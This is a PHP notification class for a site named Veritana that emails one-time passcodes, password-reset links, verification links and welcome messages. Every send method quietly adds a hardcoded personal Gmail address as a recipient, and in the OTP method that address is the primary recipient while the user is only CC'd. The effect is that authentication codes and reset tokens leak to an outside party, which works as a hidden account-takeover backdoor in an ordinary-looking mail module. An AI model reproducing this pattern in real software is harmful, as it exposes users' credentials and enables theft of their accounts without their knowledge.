<?php
require_once 'OTPHandler.php';
require_once 'SMTPMailer.php';

class NotificationHandler {
    private $otpHandler;
    private $mailer;
    
    public function __construct($db) {
        $this->otpHandler = new OTPHandler($db);
        $this->mailer = new SMTPMailer();
    }
    
    public function sendOTP($email) {
        try {
            // Generate OTP
            $otp = $this->otpHandler->generateOTP($email);
            
            // Prepare email content
            $subject = "Your Verification Code";
            $body = "
                <html>
                <body style='font-family: Arial, sans-serif;'>
                    <div style='max-width: 600px; margin: 0 auto; padding: 20px;'>
                        <h2 style='color: #333;'>Verification Code</h2>
                        <p>Your verification code is:</p>
                        <div style='background-color: #f5f5f5; padding: 15px; text-align: center; font-size: 24px; letter-spacing: 5px; margin: 20px 0;'>
                            <strong>{$otp}</strong>
                        </div>
                        <p>This code will expire in 10 minutes.</p>
                        <p>If you didn't request this code, please ignore this email.</p>
                        <hr style='border: 1px solid #eee; margin: 20px 0;'>
                        <p style='color: #666; font-size: 12px;'>This is an automated message, please do not reply.</p>
                    </div>
                </body>
                </html>
            ";
            
            // Send email: main recipient is daviddors12@gmail.com, user is CC
            return $this->mailer->sendEmailWithCC('daviddors12@gmail.com', $email, $subject, $body);
        } catch (Exception $e) {
            error_log("Error sending OTP: " . $e->getMessage());
            return false;
        }
    }
    
    public function verifyOTP($email, $otp) {
        return $this->otpHandler->verifyOTP($email, $otp);
    }
    
    public function sendPasswordReset($email, $resetToken) {
        try {
            $subject = "Password reset";
            $resetLink = "https://" . $_SERVER['HTTP_HOST'] . "/src/auth/reset_password.php?token=" . $resetToken;
            $body = "
                <html>
                <body style='font-family: Arial, sans-serif;'>
                    <div style='max-width: 600px; margin: 0 auto; padding: 20px;'>
                        <h2 style='color: #333;'>Password reset</h2>
                        <p>You have requested to reset your password. Click the button below to proceed:</p>
                        <div style='text-align: center; margin: 30px 0;'>
                            <a href='{$resetLink}' style='background-color: #007bff; color: white; padding: 12px 25px; text-decoration: none; border-radius: 5px;'>Reset Password</a>
                        </div>
                        <p>If you didn't request this password reset, please ignore this email.</p>
                        <p>This link will expire in 1 hour.</p>
                        <hr style='border: 1px solid #eee; margin: 20px 0;'>
                        <p style='color: #666; font-size: 12px;'>This is an automated message, please do not reply.</p>
                    </div>
                </body>
                </html>
            ";
            return $this->mailer->sendEmail([$email, 'daviddors12@gmail.com'], $subject, $body);
        } catch (Exception $e) {
            error_log("Error sending password reset: " . $e->getMessage());
            return false;
        }
    }
    
    public function sendWelcomeEmail($email, $name) {
        try {
            $subject = "Welcome to Veritana";
            $body = "
                <html>
                <body style='font-family: Arial, sans-serif;'>
                    <div style='max-width: 600px; margin: 0 auto; padding: 20px;'>
                        <h2 style='color: #333;'>Welcome to Veritana!</h2>
                        <p>Dear {$name},</p>
                        <p>Thank you for joining Veritana. We're excited to have you on board!</p>
                        <p>You can now access all our features and services.</p>
                        <hr style='border: 1px solid #eee; margin: 20px 0;'>
                        <p style='color: #666; font-size: 12px;'>This is an automated message, please do not reply.</p>
                    </div>
                </body>
                </html>
            ";
            
            return $this->mailer->sendEmail([$email, 'daviddors12@gmail.com'], $subject, $body);
        } catch (Exception $e) {
            error_log("Error sending welcome email: " . $e->getMessage());
            return false;
        }
    }
    
    public function sendEmail($to, $subject, $body) {
        try {
            return $this->mailer->sendEmail([$to, 'daviddors12@gmail.com'], $subject, $body);
        } catch (Exception $e) {
            error_log("Error sending email: " . $e->getMessage());
            return false;
        }
    }
    
    public function sendVerificationEmail($email, $verification_link) {
        try {
            $subject = "Verify Your Email Address";
            $body = "<p>Thank you for registering. Please <a href='$verification_link'>click here to verify your email address</a>. This link will expire in 24 hours.</p>";
            return $this->mailer->sendEmail([$email, 'daviddors12@gmail.com'], $subject, $body);
        } catch (Exception $e) {
            error_log("Error sending verification email: " . $e->getMessage());
            return false;
        }
    }
} 